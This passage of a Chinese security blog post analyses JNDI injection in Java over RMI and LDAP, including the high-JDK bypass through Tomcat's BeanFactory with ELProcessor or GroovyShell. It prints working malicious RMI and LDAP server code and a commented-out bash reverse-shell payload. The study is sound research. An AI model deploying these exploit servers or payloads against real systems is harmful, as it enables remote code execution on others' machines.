&#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(obj, name, <span class="built_in">this</span>,</span><br><span class="line">                                                   environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)</span><br><span class="line">                wrapRemoteException(e).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            ne.setRootCause(e);</span><br><span class="line">            <span class="keyword">throw</span> ne;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析源码绕过异常抛出<code>ConfigurationException</code>的方法：</p>
<ul>
<li><code>ref=null</code></li>
<li><code>ref.getFactoryClassLocation()</code> = null</li>
<li><code>trustURLCodebase</code> = true</li>
</ul>
<p>####绕过<code>ConfigurationException</code></p>
<p>解决:</p>
<p>1，ref = null，这点需要<code>rmi</code>既不是<code>Reference</code>也不是<code>Referenceable</code>的引用。这时候客户端直接实例化本地对象，远程 RMI 没有操作的空间，因此这种情况不太好利用；</p>
<p>2，<code>trustURLCodebase = true</code>。如果能使用命令行，可以直接在命令行中设置该变量，如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dcom.sun.jndi.rmi.object.trustURLCodebase=true JNDILookup rmi://localhost:1077/Foo</span><br></pre></td></tr></table></figure>

<p>3，<code>ref.getFactoryClassLocation() = null</code>,<code>getFactoryClassLocation()</code>是获取所指对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键；</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230406215334792.png" alt="image-20230406215334792"></p>
<p>满足该条件只需要在<code>rmi</code>服务中返回的<code>Reference</code>对象中不指定<code>Factory</code>的<code>coedbase</code>。（codebase：使用Java语言编写的程序，不仅可以在本地的classpath中加载类，也可以根据需要从网络上下载类。为了使Java程序可以从网络上下载类，我们需要使用codebase，codebase指定了Java程序在网络上何处可以找到需要的类）如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilClass&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>####NamingManager.getObjectInstance</p>
<p>过了上面的判断之后，<code>return NamingManager.getObjectInstance(obj, name, this, environment);</code>跟进分析下该方法干了什么:</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230408163450496.png" alt="image-20230408163450496"></p>
<p>​    也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了</p>
<p>​    由于<code>getObjectInstance</code>方法需要类实现<code>javax.naming.spi.ObjectFactory</code>接口，因此，我们实际上可以指定一个存在于目标<code>CLASSPATH</code>中的工厂类名称，交由这个工厂类去实例化实际的目标类（即引用所指向的类）从而间接实现一定的代码控制</p>
<p>利用<code>getObjectInstance</code>方法可以实例化对象。</p>
<p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#lookup()</span><br><span class="line">  RegistryContext#lookup()</span><br><span class="line">    RegistryContext#decodeObject()</span><br><span class="line">      NamingManager#getObjectInstance()</span><br><span class="line">          objectfactory = NamingManager#getObjectFactoryFromReference()</span><br><span class="line">                  Class#newInstance()  //--&gt;恶意代码被执行</span><br><span class="line">     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行</span><br></pre></td></tr></table></figure>

<p>所以，我们需要寻找满足条件的工厂类：</p>
<ul>
<li>存在于目标本地的 <code>CLASSPATH</code> 中</li>
<li>实现 <code>javax.naming.spi.ObjectFactory</code> 接口 </li>
<li>存在 <code>getObjectInstance()</code> 方法</li>
</ul>
<p>tomcat中的<code>org.apache.naming.factory.BeanFactory</code>满足上述条件。</p>
<p>另外newinstance()创建实例，只能利用无参数构造方法。而且要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令。</p>
<p><code>javax.el.ELProcessor</code>满足该条件，另外<code>groovy.lang.GroovyShell</code>也满足该条件。这里先看<code>ELProcessor</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230408214039159.png" alt="image-20230408214039159"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230408215932299.png" alt="image-20230408215932299"></p>
<p>在<code>org\apache\naming\factory\BeanFactory.class</code>中。通过<code>ref.get(&quot;forceString&quot;);</code>来获取<code>forceString</code>对应的值。<img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230409203225439.png" alt="image-20230409203225439"></p>
<p>后续再通过一系列操作将目标方法<code>javax.el.ELProcessor.eval(java.lang.String)</code>放进<code>hashmap</code>中。对应的键名是 <code>X</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230409203748053.png" alt="image-20230409203748053"></p>
<p>所以在exp中需要这样写：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>最终获取读出<code>hashmap</code>中的方法<code>invoke</code>调用<code>eval</code>方法，完成rce</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230408215303746.png" alt="image-20230408215303746"></p>
<p>ELProcessor中的<code>eval</code>方法测试。该方法可以执行<code>EL</code>表达式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ELProcessor</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ELProcessor</span>();</span><br><span class="line">        evil.eval(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>###exp - RMI</p>
<p>RMI服务 - EVILRMI</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jndi.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilRMI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1077</span>);</span><br><span class="line">            <span class="comment">//javax.el.ELProcessor：Tomcat 8+ or SpringBoot 1.2.x+ </span></span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">            <span class="comment">// ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\&quot;)&quot;));</span></span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">            registry.bind(<span class="string">&quot;calc&quot;</span>, referenceWrapper);</span><br><span class="line">            System.err.println(<span class="string">&quot;Server ready&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Server exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的<code>org.apache.naming.ResourceRef</code> 在 <code>tomcat</code> 中表示某个资源的引用，指定了资源的实际类为 <code>javax.el.ELProcessor</code>，工厂类为 <code>apache.naming.factory.BeanFactory</code>。<code>x=eval</code> 令上述代码实际执行的是 <code>ELProcessor.eval</code> 函数，其第一个参数是属性 <code>x</code> 的值，这里指定的是弹计算器。</p>
<p>JNDILookup - 客户端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jndi.RMI;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILookup</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://localhost:1077/calc&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ret: &quot;</span> + ret);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230408225741822.png" alt="image-20230408225741822"></p>
<p>另外，使用<code>groovy.lang.GroovyShell</code>也是可以的。原理与上面类似，只是rce的时候略有不同</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jndi.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilRMI_GroovyShell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1077</span>);</span><br><span class="line">          <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyShell&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">          ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>,<span class="string">&quot;x=evaluate&quot;</span>));</span><br><span class="line"></span><br><span class="line">          ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;).execute()&quot;</span>));</span><br><span class="line">          <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">          registry.bind(<span class="string">&quot;calc&quot;</span>, referenceWrapper);</span><br><span class="line">          System.err.println(<span class="string">&quot;Server ready&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">          System.err.println(<span class="string">&quot;Server exception: &quot;</span> + e.toString());</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h2><p>​    LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。</p>
<p>​    它是一种数据库，相对于mysql的表型存储；不同的是LDAP使用树型存储因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能。）</p>
<p>除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：</p>
<ul>
<li>Java序列化</li>
<li>JNDI Reference</li>
<li>Marshalled对象</li>
<li>Remote Location (已弃用)</li>
</ul>
<p>LDAP可以为存储的Java对象指定多种属性：</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData</li>
<li>…</li>
</ul>
<p>使用这些方法存储在 <code>LDAP</code> 目录中的 <code>Java</code> 对象一旦被客户端解析(反序列化)，就可能会引起远程代码执行。</p>
<p>LDAP树层次分为以下几层：</p>
<ul>
<li>dn：一条记录的详细位置，由以下几种属性组成</li>
<li>dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）</li>
<li>ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）</li>
<li>cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）</li>
</ul>
<p>举个例子一条记录就是<br>dn=”uid=songtao.xu,ou=oa,dc=example,dc=com”</p>
<h3 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h3><p>测试版本：jdk8U65</p>
<p>前面调用过程类似，在<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>这里。该方法其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象（反序列化，也就是8U191后的利用），也可能是一个<code>Reference</code>对象</p>
<p>这里先看<code>Reference</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411204955062.png" alt="image-20230411204955062"></p>
<p>在decodeReference中返回了一个新的对象引用</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411205541458.png" alt="image-20230411205541458"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411205715219.png" alt="image-20230411205715219"></p>
<p><code>LDAP</code>的获取对象的方式为根据传入的属性，创建一个新的<code>Reference</code>对象。载判断<code>var0.get(JAVA_ATTRIBUTES[5])</code>是否为空，即判断是否存在<code>javaReferenceAddress</code>。若不存在直接返回新创建的<code>Reference</code>对象<code>var5</code></p>
<p>return返回，在<code>com\sun\jndi\ldap\LdapCtx.class</code>中，又和上面的<code>rmi</code>一样，调用了<code>getObjectInstance</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411220406061.png" alt="image-20230411220406061"></p>
<p>跟进看看，其中调用了<code>getObjectFactoryFromReference</code>，</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411221027824.png" alt="image-20230411221027824"></p>
<p>他会先本地查找<code>EXP</code>类，如果不存在，则会通过<code>getFactoryClassLocation</code>远程URL，如果不为空。加载远程恶意类。</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411221610680.png" alt="image-20230411221610680"></p>
<p>调用栈：</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230411221907658.png" alt="image-20230411221907658"></p>
<p>这里测试直接用的<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>。（本地搭建ldap服务一直没成功）</p>
<h3 id="trustURLCodebase限制"><a href="#trustURLCodebase限制" class="headerlink" title="trustURLCodebase限制"></a>trustURLCodebase限制</h3><p>jdk<code>11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>版本开始默认com.sun.jndi.ldap.object.trustURLCodebase设置为false</p>
<p>在<code>com\sun\naming\internal\VersionHelper12.java#loadClass</code>中，加入了对<code>trustURLCodebase</code>的检测，<code>loadclass</code>的时候，如果<code>trustURLCodebase = false</code>则直接返回null。加载远程的字节码不会执行成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230412014947258.png" alt="image-20230412014947258"></p>
<p>绕过限制方法：使用序列化数据,触发本地Gadget</p>
<p>原因在于：LDAP中的数据可以是序列化对象，如果序列化对象会调用<code>deserializeObject</code>方法（最终调用<code>readobject</code>），返回一个反序列化对象，从而造成反序列化漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230412015554254.png" alt="image-20230412015554254"></p>
<h3 id="EXP-LDAP"><a href="#EXP-LDAP" class="headerlink" title="EXP-LDAP"></a>EXP-LDAP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jndi.LDAP;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EVIL_LDAP</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://localhost/#Evil&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">6666</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span 